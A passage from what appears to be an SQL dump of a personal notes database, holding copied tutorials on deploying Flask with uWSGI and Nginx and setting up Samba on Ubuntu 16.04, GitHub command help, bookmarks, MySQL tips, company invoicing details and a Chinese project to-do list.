a virtual environment to store our Flask project&#39;s Python requirements by typing:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>virtualenv myprojectenv </code></li>\r\n</ul>\r\n\r\n<p>This will install a local copy of Python and <code>pip</code> into a directory called <code>myprojectenv</code> within your project directory.</p>\r\n\r\n<p>Before we install applications within the virtual environment, we need to activate it. You can do so by typing:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>source myprojectenv/bin/activate </code></li>\r\n</ul>\r\n\r\n<p>Your prompt will change to indicate that you are now operating within the virtual environment. It will look something like this <code>(myprojectenv)user@host:~/myproject$</code>.</p>\r\n\r\n<h2>Set Up a Flask Application</h2>\r\n\r\n<p>Now that you are in your virtual environment, we can install Flask and uWSGI and get started on designing our application:</p>\r\n\r\n<h3>Install Flask and uWSGI</h3>\r\n\r\n<p>We can use the local instance of <code>pip</code> to install Flask and uWSGI. Type the following commands to get these two components:</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Note</p>\r\n\r\n<p>Regardless of which version of Python you are using, when the virtual environment is activated, you should use the <code>pip</code> command (not <code>pip3</code>).</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>pip install uwsgi flask </code></li>\r\n</ul>\r\n\r\n<h3>Create a Sample App</h3>\r\n\r\n<p>Now that we have Flask available, we can create a simple application. Flask is a micro-framework. It does not include many of the tools that more full-featured frameworks might, and exists mainly as a module that you can import into your projects to assist you in initializing a web application.</p>\r\n\r\n<p>While your application might be more complex, we&#39;ll create our Flask app in a single file, which we will call <code>myproject.py</code>:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>nano ~/myproject/myproject.py </code></li>\r\n</ul>\r\n\r\n<p>Within this file, we&#39;ll place our application code. Basically, we need to import Flask and instantiate a Flask object. We can use this to define the functions that should be run when a specific route is requested:</p>\r\n\r\n<p>~/myproject/myproject.py</p>\r\n\r\n<pre>\r\n<code>from flask import Flask\r\napp = Flask(__name__)\r\n\r\n@app.route(&quot;/&quot;)\r\ndef hello():\r\n    return &quot;&lt;h1 style=&#39;color:blue&#39;&gt;Hello There!&lt;/h1&gt;&quot;\r\n\r\nif __name__ == &quot;__main__&quot;:\r\n    app.run(host=&#39;0.0.0.0&#39;)\r\n</code></pre>\r\n\r\n<p>This basically defines what content to present when the root domain is accessed. Save and close the file when you&#39;re finished.</p>\r\n\r\n<p>If you followed the initial server setup guide, you should have a UFW firewall enabled. In order to test our application, we need to allow access to port 5000.</p>\r\n\r\n<p>Open up port 5000 by typing:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo ufw allow 5000 </code></li>\r\n</ul>\r\n\r\n<p>Now, you can test your Flask app by typing:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>python myproject.py </code></li>\r\n</ul>\r\n\r\n<p>Visit your server&#39;s domain name or IP address followed by <code>:5000</code> in your web browser:</p>\r\n\r\n<pre>\r\n<code>http://server_domain_or_IP:5000\r\n</code></pre>\r\n\r\n<p>You should see something like this:</p>\r\n\r\n<p><img alt=\"Flask sample app\" src=\"https://assets.digitalocean.com/articles/nginx_uwsgi_wsgi_1404/test_app.png\" /></p>\r\n\r\n<p>When you are finished, hit CTRL-C in your terminal window a few times to stop the Flask development server.</p>\r\n\r\n<h3>Create the WSGI Entry Point</h3>\r\n\r\n<p>Next, we&#39;ll create a file that will serve as the entry point for our application. This will tell our uWSGI server how to interact with the application.</p>\r\n\r\n<p>We will call the file <code>wsgi.py</code>:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>nano ~/myproject/wsgi.py </code></li>\r\n</ul>\r\n\r\n<p>The file is incredibly simple, we can simply import the Flask instance from our application and then run it:</p>\r\n\r\n<p>~/myproject/wsgi.py</p>\r\n\r\n<pre>\r\n<code>from myproject import app\r\n\r\nif __name__ == &quot;__main__&quot;:\r\n    app.run()\r\n</code></pre>\r\n\r\n<p>Save and close the file when you are finished.</p>\r\n\r\n<h2>Configure uWSGI</h2>\r\n\r\n<p>Our application is now written and our entry point established. We can now move on to uWSGI.</p>\r\n\r\n<h3>Testing uWSGI Serving</h3>\r\n\r\n<p>The first thing we will do is test to make sure that uWSGI can serve our application.</p>\r\n\r\n<p>We can do this by simply passing it the name of our entry point. This is constructed by the name of the module (minus the <code>.py</code> extension, as usual) plus the name of the callable within the application. In our case, this would be <code>wsgi:app</code>.</p>\r\n\r\n<p>We&#39;ll also specify the socket so that it will be started on a publicly available interface and the protocol so that it will use HTTP instead of the <code>uwsgi</code> binary protocol. We&#39;ll use the same port number that we opened earlier:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>uwsgi --socket 0.0.0.0:5000 --protocol=http -w wsgi:app </code></li>\r\n</ul>\r\n\r\n<p>Visit your server&#39;s domain name or IP address with <code>:5000</code> appended to the end in your web browser again:</p>\r\n\r\n<pre>\r\n<code>http://server_domain_or_IP:5000\r\n</code></pre>\r\n\r\n<p>You should see your application&#39;s output again:</p>\r\n\r\n<p><img alt=\"Flask sample app\" src=\"https://assets.digitalocean.com/articles/nginx_uwsgi_wsgi_1404/test_app.png\" /></p>\r\n\r\n<p>When you have confirmed that it&#39;s functioning properly, press CTRL-C in your terminal window.</p>\r\n\r\n<p>We&#39;re now done with our virtual environment, so we can deactivate it:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>deactivate </code></li>\r\n</ul>\r\n\r\n<p>Any Python commands will now use the system&#39;s Python environment again.</p>\r\n\r\n<h3>Creating a uWSGI Configuration File</h3>\r\n\r\n<p>We have tested that uWSGI is able to serve our application, but we want something more robust for long-term usage. We can create a uWSGI configuration file with the options we want.</p>\r\n\r\n<p>Let&#39;s place that in our project directory and call it <code>myproject.ini</code>:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>nano ~/myproject/myproject.ini </code></li>\r\n</ul>\r\n\r\n<p>Inside, we will start off with the <code>[uwsgi]</code> header so that uWSGI knows to apply the settings. We&#39;ll specify the module by referring to our <code>wsgi.py</code> file, minus the extension, and that the callable within the file is called &quot;app&quot;:</p>\r\n\r\n<p>~/myproject/myproject.ini</p>\r\n\r\n<pre>\r\n<code>[uwsgi]\r\nmodule = wsgi:app\r\n</code></pre>\r\n\r\n<p>Next, we&#39;ll tell uWSGI to start up in master mode and spawn five worker processes to serve actual requests:</p>\r\n\r\n<p>~/myproject/myproject.ini</p>\r\n\r\n<pre>\r\n<code>[uwsgi]\r\nmodule = wsgi:app\r\n\r\nmaster = true\r\nprocesses = 5\r\n</code></pre>\r\n\r\n<p>When we were testing, we exposed uWSGI on a network port. However, we&#39;re going to be using Nginx to handle actual client connections, which will then pass requests to uWSGI. Since these components are operating on the same computer, a Unix socket is preferred because it is more secure and faster. We&#39;ll call the socket <code>myproject.sock</code> and place it in this directory.</p>\r\n\r\n<p>We&#39;ll also have to change the permissions on the socket. We&#39;ll be giving the Nginx group ownership of the uWSGI process later on, so we need to make sure the group owner of the socket can read information from it and write to it. We will also clean up the socket when the process stops by adding the &quot;vacuum&quot; option:</p>\r\n\r\n<p>~/myproject/myproject.ini</p>\r\n\r\n<pre>\r\n<code>[uwsgi]\r\nmodule = wsgi:app\r\n\r\nmaster = true\r\nprocesses = 5\r\n\r\nsocket = myproject.sock\r\nchmod-socket = 660\r\nvacuum = true\r\n</code></pre>\r\n\r\n<p>The last thing we need to do is set the <code>die-on-term</code> option. This can help ensure that the init system and uWSGI have the same assumptions about what each process signal means. Setting this aligns the two system components, implementing the expected behavior:</p>\r\n\r\n<p>~/myproject/myproject.ini</p>\r\n\r\n<pre>\r\n<code>[uwsgi]\r\nmodule = wsgi:app\r\n\r\nmaster = true\r\nprocesses = 5\r\n\r\nsocket = myproject.sock\r\nchmod-socket = 660\r\nvacuum = true\r\n\r\ndie-on-term = true\r\n</code></pre>\r\n\r\n<p>You may have noticed that we did not specify a protocol like we did from the command line. That is because by default, uWSGI speaks using the <code>uwsgi</code> protocol, a fast binary protocol designed to communicate with other servers. Nginx can speak this protocol natively, so it&#39;s better to use this than to force communication by HTTP.</p>\r\n\r\n<p>When you are finished, save and close the file.</p>\r\n\r\n<h2>Create a systemd Unit File</h2>\r\n\r\n<p>The next piece we need to take care of is the systemd service unit file. Creating a systemd unit file will allow Ubuntu&#39;s init system to automatically start uWSGI and serve our Flask application whenever the server boots.</p>\r\n\r\n<p>Create a unit file ending in .service within the /etc/systemd/system directory to begin:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo nano /etc/systemd/system/myproject.service </code></li>\r\n</ul>\r\n\r\n<p>Inside, we&#39;ll start with the <code>[Unit]</code> section, which is used to specify metadata and dependencies. We&#39;ll put a description of our service here and tell the init system to only start this after the networking target has been reached:</p>\r\n\r\n<p>/etc/systemd/system/myproject.service</p>\r\n\r\n<pre>\r\n<code>[Unit]\r\nDescription=uWSGI instance to serve myproject\r\nAfter=network.target\r\n</code></pre>\r\n\r\n<p>Next, we&#39;ll open up the <code>[Service]</code> section. We&#39;ll specify the user and group that we want the process to run under. We will give our regular user account ownership of the process since it owns all of the relevant files. We&#39;ll give group ownership to the <code>www-data</code> group so that Nginx can communicate easily with the uWSGI processes.</p>\r\n\r\n<p>We&#39;ll then map out the working directory and set the <code>PATH</code> environmental variable so that the init system knows where our the executables for the process are located (within our virtual environment). We&#39;ll then specify the commanded to start the service. Systemd requires that we give the full path to the uWSGI executable, which is installed within our virtual environment. We will pass the name of the .ini configuration file we created in our project directory:</p>\r\n\r\n<p>/etc/systemd/system/myproject.service</p>\r\n\r\n<pre>\r\n<code>[Unit]\r\nDescription=uWSGI instance to serve myproject\r\nAfter=network.target\r\n\r\n[Service]\r\nUser=sammy\r\nGroup=www-data\r\nWorkingDirectory=/home/sammy/myproject\r\nEnvironment=&quot;PATH=/home/sammy/myproject/myprojectenv/bin&quot;\r\nExecStart=/home/sammy/myproject/myprojectenv/bin/uwsgi --ini myproject.ini\r\n</code></pre>\r\n\r\n<p>Finally, we&#39;ll add an <code>[Install]</code> section. This will tell systemd what to link this service to if we enable it to start at boot. We want this service to start when the regular multi-user system is up and running:</p>\r\n\r\n<p>/etc/systemd/system/myproject.service</p>\r\n\r\n<pre>\r\n<code>[Unit]\r\nDescription=uWSGI instance to serve myproject\r\nAfter=network.target\r\n\r\n[Service]\r\nUser=sammy\r\nGroup=www-data\r\nWorkingDirectory=/home/sammy/myproject\r\nEnvironment=&quot;PATH=/home/sammy/myproject/myprojectenv/bin&quot;\r\nExecStart=/home/sammy/myproject/myprojectenv/bin/uwsgi --ini myproject.ini\r\n\r\n[Install]\r\nWantedBy=multi-user.target\r\n</code></pre>\r\n\r\n<p>With that, our systemd service file is complete. Save and close it now.</p>\r\n\r\n<p>We can now start the uWSGI service we created and enable it so that it starts at boot:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo systemctl start myproject </code></li>\r\n	<li><code>sudo systemctl enable myproject </code></li>\r\n</ul>\r\n\r\n<h2>Configuring Nginx to Proxy Requests</h2>\r\n\r\n<p>Our uWSGI application server should now be up and running, waiting for requests on the socket file in the project directory. We need to configure Nginx to pass web requests to that socket using the <code>uwsgi</code> protocol.</p>\r\n\r\n<p>Begin by creating a new server block configuration file in Nginx&#39;s <code>sites-available</code> directory. We&#39;ll simply call this <code>myproject</code> to keep in line with the rest of the guide:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo nano /etc/nginx/sites-available/myproject </code></li>\r\n</ul>\r\n\r\n<p>Open up a server block and tell Nginx to listen on the default port 80. We also need to tell it to use this block for requests for our server&#39;s domain name or IP address:</p>\r\n\r\n<p>/etc/nginx/sites-available/myproject</p>\r\n\r\n<pre>\r\n<code>server {\r\n    listen 80;\r\n    server_name server_domain_or_IP;\r\n}\r\n</code></pre>\r\n\r\n<p>The only other thing that we need to add is a location block that matches every request. Within this block, we&#39;ll include the <code>uwsgi_params</code> file that specifies some general uWSGI parameters that need to be set. We&#39;ll then pass the requests to the socket we defined using the <code>uwsgi_pass</code> directive:</p>\r\n\r\n<p>/etc/nginx/sites-available/myproject</p>\r\n\r\n<pre>\r\n<code>server {\r\n    listen 80;\r\n    server_name server_domain_or_IP;\r\n\r\n    location / {\r\n        include uwsgi_params;\r\n        uwsgi_pass unix:/home/sammy/myproject/myproject.sock;\r\n    }\r\n}\r\n</code></pre>\r\n\r\n<p>That&#39;s actually all we need to serve our application. Save and close the file when you&#39;re finished.</p>\r\n\r\n<p>To enable the Nginx server block configuration we&#39;ve just created, link the file to the <code>sites-enabled</code> directory:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo ln -s /etc/nginx/sites-available/myproject /etc/nginx/sites-enabled </code></li>\r\n</ul>\r\n\r\n<p>With the file in that directory, we can test for syntax errors by typing:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo nginx -t </code></li>\r\n</ul>\r\n\r\n<p>If this returns without indicating any issues, we can restart the Nginx process to read the our new config:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo systemctl restart nginx </code></li>\r\n</ul>\r\n\r\n<p>The last thing we need to do is adjust our firewall again. We no longer need access through port 5000, so we can remove that rule. We can then allow access to the Nginx server:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo ufw delete allow 5000 </code></li>\r\n	<li><code>sudo ufw allow &#39;Nginx Full&#39; </code></li>\r\n</ul>\r\n\r\n<p>You should now be able to go to your server&#39;s domain name or IP address in your web browser:</p>\r\n\r\n<pre>\r\n<code>http://server_domain_or_IP\r\n</code></pre>\r\n\r\n<p>You should see your application output:</p>\r\n\r\n<p><img alt=\"Flask sample app\" src=\"https://assets.digitalocean.com/articles/nginx_uwsgi_wsgi_1404/test_app.png\" /></p>\r\n','2018-01-23 07:39:03','How To Serve Flask Applications with uWSGI and Nginx on Ubuntu 16.04 | DigitalOcean'),(64,'yebin','<p>Github Help:</p>\r\n\r\n<p>https://github.com/misterye/terminals.git<br />\r\n-----------------------------------------------<br />\r\n&hellip;or create a new repository on the command line</p>\r\n\r\n<p>echo &quot;# terminals&quot; &gt;&gt; README.md<br />\r\ngit init<br />\r\ngit add README.md<br />\r\ngit commit -m &quot;first commit&quot;<br />\r\ngit remote add origin https://github.com/misterye/terminals.git<br />\r\ngit push -u origin master<br />\r\n-----------------------------------------------</p>\r\n\r\n<p>&hellip;or push an existing repository from the command line</p>\r\n\r\n<p>git remote add origin https://github.com/misterye/terminals.git<br />\r\ngit push -u origin master<br />\r\n-----------------------------------------------</p>\r\n\r\n<p>&hellip;or import code from another repository<br />\r\nYou can initialize this repository with code from a Subversion, Mercurial, or TFS project.<br />\r\n-----------------------------------------------</p>\r\n\r\n<p>Add new local directory to a git remote branch：</p>\r\n\r\n<p>Clone the remote repository on to your PC.</p>\r\n\r\n<p>git clone user@example.com:myproject.git</p>\r\n\r\n<p>Checkout the branch to which you would like to add those files.</p>\r\n\r\n<p>cd myproject</p>\r\n\r\n<p>git checkout -b my_new_branch</p>\r\n\r\n<p>Move the files into your project directory, then add &amp; commit them.</p>\r\n\r\n<p>git add .</p>\r\n\r\n<p>git commit -m &quot;new files for my new branch&quot;</p>\r\n\r\n<p>You&#39;ll probably want to push, too.</p>\r\n\r\n<p>git push origin my_new_branch</p>\r\n','2018-01-23 08:34:27','Github Help'),(65,'yebin','<p>Easy WebSockets with Flask and Gevent:</p>\r\n\r\n<p>https://blog.miguelgrinberg.com/post/easy-websockets-with-flask-and-gevent</p>\r\n','2018-01-24 05:11:08','Easy WebSockets with Flask and Gevent'),(66,'yebin','<p>名称：上海全通诺特通信技术有限公司</p>\r\n\r\n<p>纳税人识别号： 91310000698760764Y</p>\r\n\r\n<p>地址电话：中国（上海）自由贸易试验区新金桥路1088号1403号 021-33927568</p>\r\n\r\n<p>开户行及账号：中国民生银行上海世纪公园支行 0228014180000645&nbsp;</p>\r\n','2018-01-24 10:22:17','申斯发票'),(67,'yebin','<p>远程控制时序器：</p>\r\n\r\n<p>Raspberry Pi controlled power sockets:</p>\r\n\r\n<p>https://blog.haschek.at/post/faa40</p>\r\n\r\n<p>mysql 数据库备份与恢复：</p>\r\n\r\n<p>http://webcheatsheet.com/sql/mysql_backup_restore.php#restore</p>\r\n\r\n<p>mysql 创建utf8的数据库：</p>\r\n\r\n<pre>\r\n<code>CREATE DATABASE mydatabase CHARACTER SET utf8 COLLATE utf8_general_ci;</code></pre>\r\n\r\n<p>或者</p>\r\n\r\n<pre>\r\n<code>CREATE DATABASE mydatabase CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;</code></pre>\r\n\r\n<p><code>参考：</code></p>\r\n\r\n<p><code>https://dba.stackexchange.com/questions/76788/create-a-database-with-charset-utf-8</code></p>\r\n\r\n<p><code>pip install flask-mysqldb 失败解决方案：</code></p>\r\n\r\n<p>apt-get install build-essential python-dev libmysqlclient-dev</p>\r\n\r\n<p>参考：</p>\r\n\r\n<p>http://mysql-python.blogspot.com/2012/11/is-mysqldb-hard-to-install.html</p>\r\n','2018-01-25 03:08:32','远程控制时序器及数据库备份与恢复'),(68,'yebin','<h1>Samba Server installation on Ubuntu 16.04 LTS</h1>\r\n\r\n<p>https://www.howtoforge.com/tutorial/samba-server-ubuntu-16-04/</p>\r\n\r\n<h2>1 Preliminary Note</h2>\r\n\r\n<p>I have fresh installed Ubuntu 16.04 server, on which I am going to install the samba server. As Samba client system, I will use a Windows Desktop to connect to the samba server and check the setup. The Windows Desktop should be in the same network so that it is able to reach the Ubuntu server. The hostname of my Ubuntu server is&nbsp;server1.example.com&nbsp;and the IP is&nbsp;192.168.1.100</p>\r\n\r\n<p>If you don&#39;t have a Ubuntu server already, follow this&nbsp;<a href=\"https://www.howtoforge.com/tutorial/ubuntu-minimal-server-install/\" target=\"_blank\">tutorial</a>&nbsp;to get a minimal server setup as the&nbsp;basis for this tutorial.</p>\r\n\r\n<p><strong>Note:</strong>&nbsp;The Windows machine must be in the same workgroup. To check the value in the Windows machine run the following command at cmd prompt:</p>\r\n\r\n<p>net config workstation</p>\r\n\r\n<p>The output will be like this:</p>\r\n\r\n<p><a href=\"https://www.howtoforge.com/images/samba-server-ubuntu-16.04/big/net_config_workstation.png\"><img alt=\"Get the Windows Workgroup name.\" src=\"https://www.howtoforge.com/images/samba-server-ubuntu-16.04/net_config_workstation.png\" style=\"height:279px; width:550px\" /></a></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Your Windows machine must be in the same Workstation domain as the Ubuntu server, i.e.&nbsp;WORKGROUP&nbsp;in my case.</p>\r\n\r\n<p>To make the windows machine reachable in Windows by its hostname, proceed like this.&nbsp;Open a Windows terminal in administrator mode (you can reach the administrator mode by doing a right-click on the Terminal icon in the program menu) and run the following command to open the Windows hosts file:</p>\r\n\r\n<p>notepad C:\\\\Windows\\System32\\drivers\\etc\\hosts</p>\r\n\r\n<p>There you add the following red line and save the file:</p>\r\n\r\n<pre>\r\n[...]\r\n192.168.1.100 	server1.example.com	server1</pre>\r\n\r\n<p>The following steps have to be run as root user. Run:</p>\r\n\r\n<p>sudo -s</p>\r\n\r\n<p>on the shell of your Linux server to become the root user.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<h2>2 Anonymous Samba sharing</h2>\r\n\r\n<p>Samba is available in the Ubuntu repositories. The first step is to install the Samba Server and its dependencies with apt.</p>\r\n\r\n<p>apt-get install -y samba samba-common python-glade2 system-config-samba</p>\r\n\r\n<p>It will install the Samba&nbsp;version 4.3.9-Ubuntu.</p>\r\n\r\n<p>To configure samba, edit the file&nbsp;/etc/samba/smb.conf.&nbsp;I will use nano as editor and&nbsp;make a backup of the original file before I start to change it. The backup file is named&nbsp;/etc/samba/smb.conf.bak</p>\r\n\r\n<p>cp -pf /etc/samba/smb.conf /etc/samba/smb.conf.bak<br />\r\ncat /dev/null&nbsp; &gt; /etc/samba/smb.conf</p>\r\n\r\n<p>Open the Samba configuration file with nano:</p>\r\n\r\n<p>nano /etc/samba/smb.conf</p>\r\n\r\n<p>And add the following lines.</p>\r\n\r\n<pre>\r\n[global]\r\nworkgroup = WORKGROUP\r\nserver string = Samba Server %v\r\nnetbios name = ubuntu\r\nsecurity = user\r\nmap to guest = bad user\r\ndns proxy = no\r\n\r\n#============================ Share Definitions ============================== \r\n\r\n[Anonymous]\r\npath = /samba/anonymous\r\nbrowsable =yes\r\nwritable = yes\r\nguest ok = yes\r\nread only = no\r\nforce user = nobody</pre>\r\n\r\n<p>Then I&#39;ll create a directory for the anonymous share.</p>\r\n\r\n<p>mkdir -p /samba/anonymous</p>\r\n\r\n<p>Set the correct permissions.</p>\r\n\r\n<p>chmod -R 0775 /samba/anonymous<br />\r\nchown -R nobody:nogroup&nbsp;/samba/anonymous</p>\r\n\r\n<p>And restart Samba to apply the new configuration.</p>\r\n\r\n<p>service smbd restart</p>\r\n\r\n<p>Now you can access the Ubuntu sharing in Windows&nbsp;by entering &quot;\\\\server1&quot; in the windows search field of the menu or use the network browser of the Windows file explorer to connect to the share.</p>\r\n\r\n<p><a href=\"https://www.howtoforge.com/images/samba-server-ubuntu-16.04/big/samba_anonymous_share.png\"><img alt=\"The Samba anonymous share shows up in Windows.\" src=\"https://www.howtoforge.com/images/samba-server-ubuntu-16.04/samba_anonymous_share.png\" style=\"height:281px; width:550px\" /></a></p>\r\n\r\n<p>Try to upload a file by Drag&amp;Drop to the share to see if it is working correctly.</p>\r\n\r\n<p><a href=\"https://www.howtoforge.com/images/samba-server-ubuntu-16.04/big/samba_anon_share_test_file.png\"><img alt=\"The Upload to the anonymous Samba share was successful.\" src=\"https://www.howtoforge.com/images/samba-server-ubuntu-16.04/samba_anon_share_test_file.png\" style=\"height:281px; width:550px\" /></a></p>\r\n\r\n<p>You can cross check the content at server also.</p>\r\n\r\n<p>ls -la /samba/anonymous/</p>\r\n\r\n<p>root@server1:/samba/anonymous# ls -la /samba/anonymous/<br />\r\ntotal 16<br />\r\ndrwxrwxr-x 2 nobody nogroup 4096 Jun 1 18:46 .<br />\r\ndrwxr-xr-x 3 root root 4096 Jun 1 18:39 ..<br />\r\n-rwxr--r-- 1 nobody nogroup 7405 Jun 1 18:42 test.odt<br />\r\nroot@server1:/samba/anonymous#</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<h2>3 Secured Samba server</h2>\r\n\r\n<p>For the password-protected share, I will create a group&nbsp;smbgrp&nbsp;and user&nbsp;<em>till</em>&nbsp;to access the Samba server. I&#39;ll use &quot;howtoforge&quot; as password in this example, please choose a custom and secure password on your server.</p>\r\n\r\n<p>addgroup smbgrp</p>\r\n\r\n<p>useradd till -G smbgrp</p>\r\n\r\n<p>smbpasswd -a&nbsp;till</p>\r\n\r\n<p>root@server1:~# smbpasswd -a&nbsp;till<br />\r\nNew SMB password:<strong>&lt;--howtoforge</strong><br />\r\nRetype new SMB password:<strong>&lt;--howtoforge</strong><br />\r\nAdded user till.<br />\r\nroot@server1:~#</p>\r\n\r\n<p>Now create the folder with the name &quot;secured&quot;&nbsp;in the /samba folder and give permissions like this</p>\r\n\r\n<p>mkdir -p /samba/secured<br />\r\ncd /samba<br />\r\nchmod -R 0770 secured<br />\r\nchown root:smbgrp&nbsp;secured</p>\r\n\r\n<p>Edit the Samba configuration file and add the following (red) lines at the end of the file:</p>\r\n\r\n<p>nano /etc/samba/smb.conf</p>\r\n\r\n<pre>\r\n[...]\r\n[secured]\r\n path = /samba/secured\r\n valid users = @smbgrp\r\n guest ok = no\r\n writable = yes\r\n browsable = yes</pre>\r\n\r\n<p>service smbd restart&nbsp;</p>\r\n\r\n<p>To cross-check the settings, run this command:</p>\r\n\r\n<p>testparm</p>\r\n\r\n<p>root@server1:/samba# testparm<br />\r\nLoad smb config files from /etc/samba/smb.conf<br />\r\nrlimit_max: increasing rlimit_max (1024) to minimum Windows limit (16384)<br />\r\nProcessing section &quot;[Anonymous]&quot;<br />\r\nProcessing section &quot;[secured]&quot;<br />\r\nLoaded services file OK.<br />\r\nServer role: ROLE_STANDALONE</p>\r\n\r\n<p>Press enter to see a dump of your service definitions&nbsp;&lt;-- Press Enter</p>\r\n\r\n<p># Global parameters<br />\r\n[global]<br />\r\nnetbios name = UBUNTU<br />\r\nserver string = Samba Server %v<br />\r\nsecurity = USER<br />\r\nmap to guest = Bad User<br />\r\ndns proxy = No<br />\r\nidmap config * : backend = tdb</p>\r\n\r\n<p><br />\r\n[Anonymous]<br />\r\npath = /samba/anonymous<br />\r\nforce user = nobody<br />\r\nread only = No<br />\r\nguest ok = Yes</p>\r\n\r\n<p><br />\r\n[secured]<br />\r\npath = /samba/secured<br />\r\nvalid users = @smbgrp<br />\r\nread only = No</p>\r\n\r\n<p>At the Windows machine, open the &quot;<em>\\\\server1&quot;</em>&nbsp;network device again, it will request a username and password now. Enter the user details that you created above. In my case, the values were&nbsp;user=<em>till</em>&nbsp;and&nbsp;password=howtoforge.</p>\r\n\r\n<p><a href=\"https://www.howtoforge.com/images/samba-server-ubuntu-16.04/big/windows_share_login1.png\"><img alt=\"Login to the Samba share.\" src=\"https://www.howtoforge.com/images/samba-server-ubuntu-16.04/windows_share_login1.png\" style=\"height:351px; width:439px\" /></a></p>\r\n\r\n<p><br />\r\n<a href=\"https://www.howtoforge.com/images/samba-server-ubuntu-16.04/big/samba_two_shares.png\"><img alt=\"Both Samba shares show in Windows Explorer.\" src=\"https://www.howtoforge.com/images/samba-server-ubuntu-16.04/samba_two_shares.png\" style=\"height:281px; width:550px\" /></a></p>\r\n\r\n<p><a href=\"https://www.howtoforge.com/images/samba-server-ubuntu-16.04/big/secured_test_file.png\"><img alt=\"The test-upload worked.\" src=\"https://www.howtoforge.com/images/samba-server-ubuntu-16.04/secured_test_file.png\" style=\"height:281px; width:550px\" /></a></p>\r\n\r\n<p>We can check the file at the Ubuntu server like this:</p>\r\n\r\n<p>ls -la /samba/secured/</p>\r\n\r\n<p>root@server1:/samba# ls -la /samba/secured/<br />\r\ntotal 16<br />\r\ndrwxrwx--- 2 root smbgrp 4096 Jun 1 19:25 .<br />\r\ndrwxr-xr-x 4 root root 4096 Jun 1 18:49 ..<br />\r\n-rwxr--r-- 1 till till 7405 Jun 1 18:42 test.odt<br />\r\nroot@server1:/samba#</p>\r\n\r\n<p>Now we have a successfully configured Samba server with an anonymous and a secured share on Ubuntu 16.04 :)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<h2>4&nbsp;Virtual machine image download of this tutorial</h2>\r\n\r\n<p>This tutorial is available as ready to use virtual machine image in ovf/ova format that is compatible with VMWare and Virtualbox. The virtual machine image uses the following login details:</p>\r\n\r\n<p><strong>SSH / Shell Login</strong></p>\r\n\r\n<p>Username: administrator<br />\r\nPassword: howtoforge</p>\r\n\r\n<p>This user has sudo rights.</p>\r\n\r\n<p>The IP of the VM is 192.168.1.100, it can be changed in the file /etc/network/interfaces. Please change all the above passwords to secure the virtual machine.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<h2>5 Links</h2>\r\n\r\n<ul>\r\n	<li>Ubuntu :&nbsp;&nbsp;<a href=\"http://www.ubuntu.com/\" target=\"_blank\">http://www.ubuntu.com/</a></li>\r\n	<li>Samba :&nbsp;&nbsp;<a href=\"http://www.samba.org/samba/\" target=\"_blank\">http://www.samba.org/samba/</a></li>\r\n</ul>\r\n','2018-01-26 02:09:20','Samba Server installation on Ubuntu 16.04 LTS'),(69,'yebin','<p>https://www.masterclass.com/</p>\r\n','2018-01-27 12:01:34','masterclass'),(70,'yebin','<p>核对功能演示ppt<br />\r\n找严科长签字盖章<br />\r\n正本打印蛇纹封面胶装并标记正本<br />\r\n复印8本</p>\r\n\r\n<p>与严科长确认：<br />\r\n一、《开工申请审批表》<br />\r\n1、项目经理<br />\r\n二、《阶段性测试验收报审表》<br />\r\n三、《设备变更申请表》<br />\r\n三份表格交给严科长和田教授，其中一份已经插入终验资料<br />\r\n三份表格都要签字盖章</p>\r\n\r\n<p>P205、P213、P242 需要补人防办的公章<br />\r\n其中，P242 培训签名表（让严科长找其他同事帮忙签字）</p>\r\n\r\n<p>取钱，9个信封，每个信封1000元（评审费）。</p>\r\n','2018-01-30 09:02:11','淮安民防验收 - 20180130'),(71,'yebin','<h1>How to Docker</h1>\r\n\r\n<p>https://jonnylangefeld.github.io/learning/Docker/How%2Bto%2BDocker.html</p>\r\n','2018-02-04 11:06:41','How to Docker'),(72,'yebin','<h1>How To Set Up an OpenVPN Server on Ubuntu 16.04</h1>\r\n\r\n<p><a href=\"https://www.digitalocean.com/community/tutorials/how-to-set-up-an-openvpn-server-on-ubuntu-16-04\" target=\"_blank\">Original Link</a></p>\r\n\r\n<p>PostedMay 4, 2016 1.1m views <a href=\"https://www.digitalocean.com/community/tags/vpn?type=tutorials\">VPN</a> <a href=\"https://www.digitalocean.com/community/tags/ubuntu?type=tutorials\">Ubuntu</a> <a href=\"https://www.digitalocean.com/community/tags/ubuntu-16-04?type=tutorials\">Ubuntu 